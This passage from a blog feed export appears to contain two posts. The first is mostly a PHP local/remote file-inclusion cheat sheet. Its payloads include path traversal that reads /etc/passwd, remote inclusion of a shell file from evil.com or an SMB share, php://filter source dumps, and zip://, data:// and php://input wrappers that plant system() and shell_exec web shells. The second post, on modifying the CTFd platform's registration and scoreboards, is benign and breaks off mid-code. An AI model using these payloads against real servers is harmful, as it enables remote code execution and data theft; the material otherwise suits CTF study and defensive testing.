python">http://52hertz.tech/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd<br>http://52hertz.tech/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h2 id="Path-and-dot-truncation"><a href="#Path-and-dot-truncation" class="headerlink" title="Path and dot truncation"></a>Path and dot truncation</h2><p>长度截断：大多数情况下，一直重复目录字符串 <code>./</code> ，超过4096个字节的文件名将被剪切掉(Windows 下是256byte)，因此多余的字符将被丢弃。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=../../../etc/passwd............[ADD MORE]<br>http://52hertz.tech/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]<br>http://52hertz.tech/index.php?page=../../../etc/passwd/./././././.[ADD MORE] <br>http://52hertz.tech/index.php?page=../../../[ADD MORE]../../../../etc/passwd<br></code></pre></td></tr></table></figure><h2 id="Filter-bypass-tricks"><a href="#Filter-bypass-tricks" class="headerlink" title="Filter bypass tricks"></a>Filter bypass tricks</h2><p>当然有时候可能过滤掉 <code>./</code>，有一些 bypass 的小技巧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=....//....//etc/passwd<br>http://52hertz.tech/index.php?page=..///////..////..//////etc/passwd<br>http://52hertz.tech/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd<br></code></pre></td></tr></table></figure><h1 id="Basic-RFI"><a href="#Basic-RFI" class="headerlink" title="Basic RFI"></a>Basic RFI</h1><p>LFI(Remote File Inclusion，远程文件包含)，漏洞条件：<code>allow_url_include</code> 为 <code>On</code></p><p>Most of the filter bypasses from LFI section can be reused for RFI.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">52</span>hertz.tech<span class="hljs-regexp">/index.php?page=http:/</span><span class="hljs-regexp">/evil.com/</span>shell.txt<br></code></pre></td></tr></table></figure><h2 id="Null-byte"><a href="#Null-byte" class="headerlink" title="Null byte"></a>Null byte</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">52</span>hertz.tech<span class="hljs-regexp">/index.php?page=http:/</span><span class="hljs-regexp">/evil.com/</span>shell.txt%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h2 id="Double-encoding-1"><a href="#Double-encoding-1" class="headerlink" title="Double encoding"></a>Double encoding</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">52</span>hertz.tech/index.php?page=http:%<span class="hljs-number">252</span>f%<span class="hljs-number">252</span>fevil.com%<span class="hljs-number">252</span>fshell.txt<br></code></pre></td></tr></table></figure><h2 id="Bypass-allow-url-include"><a href="#Bypass-allow-url-include" class="headerlink" title="Bypass allow_url_include"></a>Bypass allow_url_include</h2><p>当 <code>allow_url_include</code> and <code>allow_url_fopen</code> 都为 <code>Off</code>，可以利用SMB共享来绕过 php 远程文件包含的限制。</p><ol><li>新建一个 share </li><li>在里面写入 php  : <code>shell.php</code></li><li>然后进行包含 <code>http://52hertz.tech/index.php?page=\\6.6.6.6\share\shell.php</code></li></ol><p>freebuf 上 <a href="https://www.freebuf.com/articles/web/203577.html">有一篇文章</a> 讲得比较详细</p><h1 id="LFI-x2F-RFI-using-wrappers"><a href="#LFI-x2F-RFI-using-wrappers" class="headerlink" title="LFI &#x2F; RFI using wrappers"></a>LFI &#x2F; RFI using wrappers</h1><p>利用包装器来进行 LFI&#x2F;RFI</p><h2 id="Wrapper-php-x2F-x2F-filter"><a href="#Wrapper-php-x2F-x2F-filter" class="headerlink" title="Wrapper php:&#x2F;&#x2F;filter"></a>Wrapper php:&#x2F;&#x2F;filter</h2><p>详细文档 <a href="https://www.php.net/manual/en/wrappers.php.php">在这</a></p><p>大小写不敏感：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/read=string.rot13/resource=index.php<br>http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/convert.iconv.utf-<span class="hljs-number">8.</span>utf-<span class="hljs-number">16</span>/resource=index.php<br>http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/convert.base64-encode/resource=index.php<br>http://52hertz.tech/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure><p>可以与大型文件的压缩包装器链接在一起</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/zlib.deflate/convert.base64-encode/resource=/etc/passwd<br></code></pre></td></tr></table></figure><p>NOTE：Wrappers 可以用 <code>|</code> or <code>/</code> 进行多次链接:</p><ul><li>Multiple base64 decodes: <code>php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s</code></li><li>deflate then base64encode (useful for limited character exfil): <code>php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php</code></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./kadimus -u &quot;http://52hertz.tech/index.php?page=vuln&quot; -S -f &quot;index.php%00&quot; -O index.php --parameter page <br>curl &quot;http://52hertz.tech/index.php?page=php://filter/convert.base64-encode/resource=index.php&quot; | base64 -d &gt; index.php<br></code></pre></td></tr></table></figure><h2 id="Wrapper-zip-x2F-x2F"><a href="#Wrapper-zip-x2F-x2F" class="headerlink" title="Wrapper zip:&#x2F;&#x2F;"></a>Wrapper zip:&#x2F;&#x2F;</h2><p>详细文档 <a href="https://www.php.net/manual/en/wrappers.compression.php">在这</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;&lt;pre&gt;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&lt;/pre&gt;&quot; &gt; payload.php;  <br>zip payload.zip payload.php;<br>mv payload.zip shell.jpg;<br>rm payload.php<br><br>http://52hertz.tech/index.php?page=zip://shell.jpg%23payload.php<br></code></pre></td></tr></table></figure><h2 id="Wrapper-data-x2F-x2F"><a href="#Wrapper-data-x2F-x2F" class="headerlink" title="Wrapper data:&#x2F;&#x2F;"></a>Wrapper data:&#x2F;&#x2F;</h2><p>详细文档 <a href="https://www.php.net/manual/en/wrappers.data.php">在这</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=<br>//NOTE: the payload <span class="hljs-keyword">is</span> <span class="hljs-string">&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);echo &#x27;Shell done !&#x27;; ?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>还有这个玩意：</p><blockquote><p>Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : <code>http://52hertz.tech/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+</code></p></blockquote><h2 id="Wrapper-expect-x2F-x2F"><a href="#Wrapper-expect-x2F-x2F" class="headerlink" title="Wrapper expect:&#x2F;&#x2F;"></a>Wrapper expect:&#x2F;&#x2F;</h2><p>详细文档 <a href="https://www.php.net/manual/en/wrappers.expect.php">在这</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://example.com/index.php?page=expect://<span class="hljs-built_in">id</span><br>http://example.com/index.php?page=expect://ls<br></code></pre></td></tr></table></figure><h2 id="Wrapper-input-x2F-x2F"><a href="#Wrapper-input-x2F-x2F" class="headerlink" title="Wrapper input:&#x2F;&#x2F;"></a>Wrapper input:&#x2F;&#x2F;</h2><p>这个在CTF一些基础的php题里面经常会碰到，当代码里含有 <code>file_get_contents($var,&#39;r&#39;)</code> 进行比较的时候，这个变量我们是可控的，可以绕过一些比对验证。</p><p>使用方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">例如：<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$var</span>,<span class="hljs-string">&#x27;r&#x27;</span>) === <span class="hljs-string">&#x27;admin&#x27;</span>)<br>url: <span class="hljs-string">&quot;https://52hertz.tech/index.php?var=php://input&quot;</span><br><span class="hljs-comment">// 然后同时 POST 数据 &#x27;admin&#x27;，这样$var的值就是 admin 了</span><br></code></pre></td></tr></table></figure><p>Note：<code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code> php://input</code> 是无效的。</p><p>当然也可以通过 <code>curl</code> 命令来实现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -X POST --data &quot;admin&quot; &quot;https://52hertz.tech/index.php?var=php://input&quot;<br>curl -X POST --data &quot;&lt;?php echo shell_exec(&#x27;id&#x27;); ?&gt;&quot; &quot;https://52hertz.tech/index.php?page=php://input%00&quot; -k -v<br></code></pre></td></tr></table></figure><p>另外，Kadimus具有自动执行此攻击的模块。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./kadimus -u &quot;https://52hertz.tech/index.php?page=php://input%00&quot;  -C &#x27;&lt;?php echo shell_exec(&quot;id&quot;); ?&gt;&#x27; -T input<br></code></pre></td></tr></table></figure><h2 id="Wrapper-phar-x2F-x2F"><a href="#Wrapper-phar-x2F-x2F" class="headerlink" title="Wrapper phar:&#x2F;&#x2F;"></a>Wrapper phar:&#x2F;&#x2F;</h2><p>关于 <code>phar://</code> 的详细文档 <a href="https://www.php.net/manual/en/wrappers.phar.php">在这</a>，或者参看另一篇 <a href="">博客</a></p><p>创建一个 <code>meta-data</code> 带有序列化对象的 phar 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// create new Phar</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);<br><br><span class="hljs-comment">// add object of any class as meta data</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span> </span>&#123;&#125;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnyClass</span>;<br><span class="hljs-variable">$object</span>-&gt;data = <span class="hljs-string">&#x27;rips&#x27;</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>如果现在通过 <code>phar://</code> 包装器对我们现有的 <code>phar</code> 文件执行文件操作，则其序列化的元数据将被反序列化。 如果此应用程序有一个名为AnyClass的类，并且定义了魔术方法<code>__destruct()</code>或<code>__wakeup()</code>，则将自动调用这些方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// output: rips</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;phar://test.phar&#x27;</span>);<br></code></pre></td></tr></table></figure><p>Note: 在任何文件操作，<code>file_exists</code> 等中，都会为<code> phar://</code>触发反序列化。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFd平台针对校赛的二次开发</title>
    <link href="/2020/03/15/CTFd_second_develop/"/>
    <url>/2020/03/15/CTFd_second_develop/</url>
    
    <content type="html"><![CDATA[<h1 id="增加学号属性"><a href="#增加学号属性" class="headerlink" title="增加学号属性"></a>增加学号属性</h1><h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>在 <code>sqlite</code> 数据库，也就是 <code>ctf.db</code> 的文件里，添加一个列名为 <code>sid</code> 的字段：</p><p>我是用图形管理工具添加的，命令的话参考：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> users <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> sid <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">default</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><ol><li>字段需要设置默认值，不然 flask 会报错</li><li>字段位置不能在中间的某个位置，只能放置在最后面（默认是最后）</li></ol><h3 id="html-文件配置"><a href="#html-文件配置" class="headerlink" title="html 文件配置"></a>html 文件配置</h3><p>在 <code>/CTFd/CTFd/themes/core/templates/register.html</code> 中添加 html 表单数据，这里主要是注意 name 的值，因为是 html 的 form 表单使用这个字段名来取值</p><p><img src="https://s1.ax1x.com/2020/03/17/8tnn2V.png" alt="8tnn2V.png"></p><h3 id="auth-py-文件配置"><a href="#auth-py-文件配置" class="headerlink" title="auth.py 文件配置"></a>auth.py 文件配置</h3><p>在 <code>/CTFd/CTFd/auth.py</code> 中的 register 函数中添加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sid = Users.query.add_columns(<span class="hljs-string">&#x27;sid&#x27;</span>,<span class="hljs-string">&#x27;id&#x27;</span>).filter_by(sid=request.form[<span class="hljs-string">&#x27;sid&#x27;</span>]).first()<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/17/8tnMKU.png" alt="8tnMKU.png"></p><p>用 <code>sid = request.form.get(&quot;sid&quot;, &quot;&quot;).strip()</code> 取学号，然后在 <code>validators</code> 里写一个验证学号格式的函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_sid</span>(<span class="hljs-params">sid</span>):<br>    <span class="hljs-keyword">if</span> sid == <span class="hljs-string">&quot;wctf2020&quot;</span>: <span class="hljs-comment"># 针对校外</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(sid) == <span class="hljs-number">12</span> <span class="hljs-keyword">and</span> sid.isdigit() <span class="hljs-keyword">and</span> sid.startswith(<span class="hljs-string">&quot;201&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>函数位置：<code>/CTFd/CTFd/utils/validators/__init__.py</code></p><p>接着还是在 <code>auth.py</code> ，创建用户的时候写上 <code>sid</code></p><p><img src="https://s1.ax1x.com/2020/03/17/8tneCq.png" alt="8tneCq.png"></p><h3 id="models-类中的配置"><a href="#models-类中的配置" class="headerlink" title="models 类中的配置"></a>models 类中的配置</h3><p>在 <code>/CTFd/CTFd/models/__init__.py</code> 中的 Users 类中添加一个表单名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sid = db.Column(db.String(<span class="hljs-number">20</span>))<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/03/17/8tnuvT.png" alt="8tnuvT.png"></p><h3 id="admin面板中users的学号显示"><a href="#admin面板中users的学号显示" class="headerlink" title="admin面板中users的学号显示"></a>admin面板中users的学号显示</h3><p>文件地址 <code>/CTFd/CTFd/themes/admin/templates/users/users.html</code></p><p>这里把国家的一列用来显示学号</p><p><img src="https://s1.ax1x.com/2020/03/17/8tnQrF.png" alt="8tnQrF.png"></p><p>在过滤的下拉框增加学号的搜索选项：</p><p><img src="https://s1.ax1x.com/2020/03/17/8tnm80.png" alt="8tnm80.png"></p><p>然后在表中输出学号：</p><p><img src="https://s1.ax1x.com/2020/03/17/8tnlb4.png" alt="8tnlb4.png"></p><p>效果</p><p><img src="https://s1.ax1x.com/2020/03/17/8tn3VJ.png" alt="8tn3VJ.png"></p><h1 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h1><h3 id="校内外分类"><a href="#校内外分类" class="headerlink" title="校内外分类"></a>校内外分类</h3><p>基于学号来进行分类，首先在 <code>/CTFd/CTFd/themes/core/templates/scoreboard.html</code> 增加下拉框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control custom-select w-10&quot;</span> <span class="hljs-attr">onchange</span>=<span class="hljs-string">&quot;top.location.href=this.value&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>排名方式<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/scoreboard&quot;</span>&gt;</span>总排名<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/scoreboard/1&quot;</span>&gt;</span>校内排名<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;/scoreboard/2&quot;</span>&gt;</span>校外排名<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>更改 <code>/CTFd/utils/scores/__init__.py</code> 里的 <code>get_standings</code> 查询方式：</p><h4 id="增加参数"><a href="#增加参数" class="headerlink" title="增加参数"></a>增加参数</h4><p><img src="https://s1.ax1x.com/2020/03/17/8tn8a9.png" alt="8tn8a9.png"></p><h4 id="分情况查询"><a href="#分情况查询" class="headerlink" title="分情况查询"></a>分情况查询</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> request == <span class="hljs-string">&quot;total&quot;</span>:<br>            standings_query = (<br>                db.session.query(<br>                    Model.<span class="hljs-built_in">id</span>.label(<span class="hljs-string">&quot;account_id&quot;</span>),<br>                    Model.oauth_id.label(<span class="hljs-string">&quot;oauth_id&quot;</span>),<br>                    Model.name.label(<span class="hljs-string">&quot;name&quot;</span>),<br>                    sumscores.columns.score,<br>                )<br>                .join(sumscores, Model.<span class="hljs-built_in">id</span> == sumscores.columns.account_id)<br>                .<span class="hljs-built_in">filter</span>(Model.banned == <span class="hljs-literal">False</span>, Model.hidden == <span class="hljs-literal">False</span>)<br>                .order_by(sumscores.columns.score.desc(), sumscores.columns.<span class="hljs-built_in">id</span>)<br>            )<br>        <span class="hljs-keyword">elif</span> request == <span class="hljs-string">&quot;wust&quot;</span>:<br>            standings_query = (<br>                db.session.query(<br>                    Model.<span class="hljs-built_in">id</span>.label(<span class="hljs-string">&quot;account_id&quot;</span>),<br>                    Model.oauth_id.label(<span class="hljs-string">&quot;oauth_id&quot;</span>),<br>                    Model.name.label(<span class="hljs-string">&quot;name&quot;</span>),<br>                    sumscores.columns.score,<br>                )<br>                    .join(sumscores, Model.<span class="hljs-built_in">id</span> == sumscores.columns.account_id)<br>                    .<span class="hljs-built_in">filter</span>(Model.banned == <span class="hljs-literal">False</span>, Model.hidden == <span class="hljs-literal">False</span>, Model.sid != <span class="hljs-string">&quot;wctf2020&quot;</span>)<br>                    .order_by(sumscores.columns.score.desc(), sumscores.columns.<span class="hljs-built_in">id</span>)<br>            )<br>        <span class="hljs-keyword">elif</span> request == <span class="hljs-string">&quot;others&quot;</span>:<br>            standings_query = (<br>                db.session.query(<br>                    Model.<span class="hljs-built_in">id</span>.label(<span class="hljs-string">&quot;account_id&quot;</span>),<br>                    Model.oauth_id.label(<span class="hljs-string">&quot;oauth_id&quot;</span>),<br>                    Model.name.label(<span class="hljs-string">&quot;name&quot;</span>),<br>                    sumscores.columns.score,<br>                )<br>                    .join(sumscores, Model.<span class="hljs-built_in">id</span> == sumscores.columns.account_id)<br>                    .<span class="hljs-built_in">filter</span>(Model.banned == <span class="hljs-literal">False</span>, Model.hidden == <span class="hljs-literal">False</span>, Model.sid == <span class="hljs-string">&quot;wctf2020&quot;</span>)<br>                    .order_by(sumscores.columns.score.desc(), sumscores.columns.<span class="hljs-built_in">id</span>)<br>            )<br></code></pre></td></tr></table></figure><p>默认是总榜(0)，1为校内，2为校外。</p><p>然后在 <code>/CTFd/scoreboard.py</code> 添加路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@scoreboard.route(<span class="hljs-params"><span class="hljs-string">&quot;/scoreboard&quot;</span></span>)</span><br><span class="hljs-meta">@check_score_visibility</span><br><span class="hljs-meta">@cache.cached(<span class="hljs-params">timeout=<span class="hljs-number">60</span>, key_prefix=make_cache_key</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">listing</span>():<br>    standings = get_standings(<span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>, request=<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> render_template(<br>        <span class="hljs-string">&quot;scoreboard.html&quot;</span>,<br>        standings=standings,<br>        score_frozen=config.is_scoreboard_frozen(),<br>    )<br><br><span class="hljs-meta">@scoreboard.route(<span class="hljs-params"><span class="hljs-string">&quot;/scoreboard/1&quot;</span></span>)</span><br><span class="hljs-meta">@check_score_visibility</span><br><span class="hljs-meta">@cache.cached(<span class="hljs-params">timeout=<span class="hljs-number">60</span>, key_prefix=make_cache_key</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">listing1</span>():<br>    standings = get_standings(<span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>, request=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> render_template(<br>        <span class="hljs-string">&quot;scoreboard.html&quot;</span>,<br>        standings=standings,<br>        score_frozen=config.is_scoreboard_frozen(),<br>    )<br><br><span class="hljs-meta">@scoreboard.route(<span class="hljs-params"><span class="hljs-string">&quot;/scoreboard/2&quot;</span></span>)</span><br><span class="hljs-meta">@check_score_visibility</span><br><span class="hljs-meta">@cache.cached(<span class="hljs-params">timeout=<span class="hljs-number">60</span>, key_prefix=make_cache_key</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">listing2</span>():<br>    standings = get_standings(<span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>, request=<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">return</span> render_template(<br>        <span class="hljs-string">&quot;scoreboard.html&quot;</span>,<br>        standings=standings,<br>        score_frozen=config.is_scoreboard_frozen(),<br>    )<br></code></pre></td></tr></table></figure><h4 id="计分板图表"><a href="#计分板图表" class="headerlink" title="计分板图表"></a>计分板图表</h4><p><code>/CTFd/CTFd/api/v1/scoreboard.py</code>，对接口请求时的 url 进行分类，先添加 <code>request</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br></code></pre></td></tr></table></figure><p>然后对接口 <code>@scoreboard_namespace.route(&quot;/top/&lt;count&gt;&quot;)</code> 里进行修改，添加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/scoreboard/1&quot;</span> <span class="hljs-keyword">in</span> request.headers[<span class="hljs-string">&#x27;Referer&#x27;</span>]:<br>           board_type = <span class="hljs-number">1</span><br>       <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;/scoreboard/2&quot;</span> <span class="hljs-keyword">in</span> request.headers[<span class="hljs-string">&#x27;Referer&#x27;</span>]:<br>           board_type = <span class="hljs-number">2</span><br>       <span class="hljs-keyword">else</span>:<br>           board_type = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>然后将 <code>get_standings</code> 的参数改成 <code>standings = get_standings(count=count, request=board_type)</code></p><p><img src="https://s1.ax1x.com/2020/03/17/8tnG5R.png" alt="8tnG5R.png"></p><h1 id="前三血自动播报"><a href="#前三血自动播报" class="headerlink" title="前三血自动播报"></a>前三血自动播报</h1><p><code>/CTFd/CTFd/api/v1/challenges.py</code></p><p><img src="https://s1.ax1x.com/2020/03/17/8tnYP1.png" alt="8tnYP1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 